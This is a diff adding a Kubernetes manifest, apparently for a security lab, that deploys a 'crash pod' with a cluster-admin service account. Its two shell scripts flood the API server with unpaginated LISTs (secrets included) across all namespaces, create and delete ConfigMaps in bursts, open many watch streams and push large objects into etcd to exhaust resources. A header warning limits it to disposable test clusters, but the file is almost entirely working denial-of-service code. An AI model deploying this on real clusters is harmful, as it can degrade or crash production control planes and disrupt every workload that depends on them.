@@ -1,0 +1,219 @@
+# =============================================================================
+# Crash Pod - Generates API Server Crash-Inducing Calls
+# =============================================================================
+#
+# PURPOSE: This pod runs inside the cluster and generates API calls designed
+# to stress-test and potentially crash the Kubernetes API server.
+#
+# The pod uses a ServiceAccount with cluster-admin privileges to make
+# expensive API calls that consume API server resources.
+#
+# TECHNIQUES USED:
+#   1. Concurrent LIST operations without pagination
+#   2. Rapid creation/deletion of resources (etcd churn)
+#   3. Opening many simultaneous watch connections
+#   4. Creating deep ownership chains (finalizer chains)
+#
+# DEPLOY:
+#   kubectl apply -f crash-pod.yaml
+#
+# MONITOR:
+#   kubectl logs -f crash-pod -n insecure-ns
+#
+# WARNING: This pod WILL degrade API server performance.
+# Deploy ONLY on disposable test clusters.
+#
+# =============================================================================
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: crash-scripts
+  namespace: insecure-ns
+data:
+  # ---- Script 1: API Server Stress Test ----
+  stress-api.sh: |
+    #!/bin/bash
+    # =======================================================================
+    # API Server Stress Test Script
+    # Runs inside a pod and generates expensive API calls
+    # =======================================================================
+
+    set -u  # No set -e because we expect some calls to fail
+
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    API_SERVER="https://kubernetes.default.svc"
+    NAMESPACE="insecure-ns"
+
+    # Authenticate with the service account token
+    CURL_OPTS="-s -k -H 'Authorization: Bearer ${TOKEN}'"
+
+    echo "============================================"
+    echo " API Server Stress Test"
+    echo " Target: ${API_SERVER}"
+    echo " Time: $(date)"
+    echo "============================================"
+    echo ""
+
+    # --- Technique 1: Expensive LIST operations ---
+    echo "[1/4] Running expensive LIST operations (no pagination)..."
+    for resource in pods configmaps secrets events endpoints services; do
+        echo "  LIST all ${resource} across all namespaces..."
+        curl -s -k -H "Authorization: Bearer ${TOKEN}" \
+            "${API_SERVER}/api/v1/${resource}" -o /dev/null -w "  Response: %{http_code}, Size: %{size_download} bytes, Time: %{time_total}s\n" &
+    done
+    wait
+    echo ""
+
+    # --- Technique 2: Create many small objects rapidly ---
+    echo "[2/4] Rapid object creation (etcd write pressure)..."
+    for i in $(seq 1 100); do
+        curl -s -k -H "Authorization: Bearer ${TOKEN}" \
+            -H "Content-Type: application/json" \
+            -X POST "${API_SERVER}/api/v1/namespaces/${NAMESPACE}/configmaps" \
+            -d "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"stress-cm-${i}\",\"namespace\":\"${NAMESPACE}\"},\"data\":{\"key\":\"value-${i}\"}}" \
+            -o /dev/null &
+        if (( i % 25 == 0 )); then
+            echo "  Created $i objects..."
+            wait  # Batch to avoid fork bomb
+        fi
+    done
+    wait
+    echo "  Created 100 ConfigMaps."
+    echo ""
+
+    # --- Technique 3: Open concurrent watch streams ---
+    echo "[3/4] Opening concurrent watch streams..."
+    WATCH_PIDS=()
+    for i in $(seq 1 20); do
+        curl -s -k -H "Authorization: Bearer ${TOKEN}" \
+            "${API_SERVER}/api/v1/pods?watch=true&timeoutSeconds=30" \
+            -o /dev/null &
+        WATCH_PIDS+=($!)
+    done
+    echo "  Opened 20 watch streams (30s timeout each)."
+    echo ""
+
+    # --- Technique 4: Delete all objects rapidly ---
+    echo "[4/4] Rapid deletion (etcd write pressure + garbage collection)..."
+    for i in $(seq 1 100); do
+        curl -s -k -H "Authorization: Bearer ${TOKEN}" \
+            -X DELETE "${API_SERVER}/api/v1/namespaces/${NAMESPACE}/configmaps/stress-cm-${i}" \
+            -o /dev/null &
+        if (( i % 25 == 0 )); then
+            wait
+        fi
+    done
+    wait
+    echo "  Deleted 100 ConfigMaps."
+    echo ""
+
+    # Wait for watches to finish
+    for pid in "${WATCH_PIDS[@]}"; do
+        kill "$pid" 2>/dev/null || true
+    done
+    wait 2>/dev/null
+
+    echo "============================================"
+    echo " Stress test complete at $(date)"
+    echo "============================================"
+
+  # ---- Script 2: Resource Exhaustion via Large Objects ----
+  exhaust-resources.sh: |
+    #!/bin/bash
+    # =======================================================================
+    # Resource Exhaustion via Large Object Creation
+    # Creates large ConfigMaps to pressure etcd and API server memory
+    # =======================================================================
+
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    API_SERVER="https://kubernetes.default.svc"
+    NAMESPACE="insecure-ns"
+
+    echo "============================================"
+    echo " Resource Exhaustion Test"
+    echo " Creating large objects to pressure etcd"
+    echo "============================================"
+    echo ""
+
+    # Generate a ~500KB payload
+    PAYLOAD=$(head -c 524288 /dev/urandom | base64 | tr -d '\n' | head -c 524288)
+
+    echo "Payload size: ${#PAYLOAD} bytes"
+    echo ""
+
+    for i in $(seq 1 20); do
+        echo "Creating large ConfigMap $i/20..."
+        HTTP_CODE=$(curl -s -k -H "Authorization: Bearer ${TOKEN}" \
+            -H "Content-Type: application/json" \
+            -X POST "${API_SERVER}/api/v1/namespaces/${NAMESPACE}/configmaps" \
+            -d "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"large-cm-${i}\",\"namespace\":\"${NAMESPACE}\"},\"data\":{\"payload\":\"${PAYLOAD}\"}}" \
+            -o /dev/null -w "%{http_code}")
+        echo "  HTTP ${HTTP_CODE}"
+
+        if [ "$HTTP_CODE" = "413" ] || [ "$HTTP_CODE" = "500" ]; then
+            echo "  Server rejected/failed. etcd may be under pressure."
+            break
+        fi
+    done
+
+    echo ""
+    echo "Cleaning up..."
+    for i in $(seq 1 20); do
+        curl -s -k -H "Authorization: Bearer ${TOKEN}" \
+            -X DELETE "${API_SERVER}/api/v1/namespaces/${NAMESPACE}/configmaps/large-cm-${i}" \
+            -o /dev/null 2>/dev/null &
+    done
+    wait
+
+    echo "Resource exhaustion test complete."
+
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: crash-pod
+  namespace: insecure-ns
+  labels:
+    app: crash-demo
+    purpose: security-testing
+spec:
+  serviceAccountName: attack-sa
+  automountServiceAccountToken: true
+  restartPolicy: Never
+
+  containers:
+    - name: crash-generator
+      image: curlimages/curl:8.4.0
+      command:
+        - /bin/sh
+        - -c
+        - |
+          echo "=== Crash Pod Started ==="
+          echo "Waiting 10 seconds before starting tests..."
+          sleep 10
+
+          echo ""
+          echo "=== Running API Server Stress Test ==="
+          sh /scripts/stress-api.sh
+
+          echo ""
+          echo "=== Stress tests complete ==="
+          echo "Pod will remain running for log inspection."
+          sleep infinity
+      volumeMounts:
+        - name: scripts
+          mountPath: /scripts
+      resources:
+        requests:
+          memory: "128Mi"
+          cpu: "100m"
+        limits:
+          memory: "512Mi"
+          cpu: "500m"
+
+  volumes:
+    - name: scripts
+      configMap:
+        name: crash-scripts
+        defaultMode: 0755
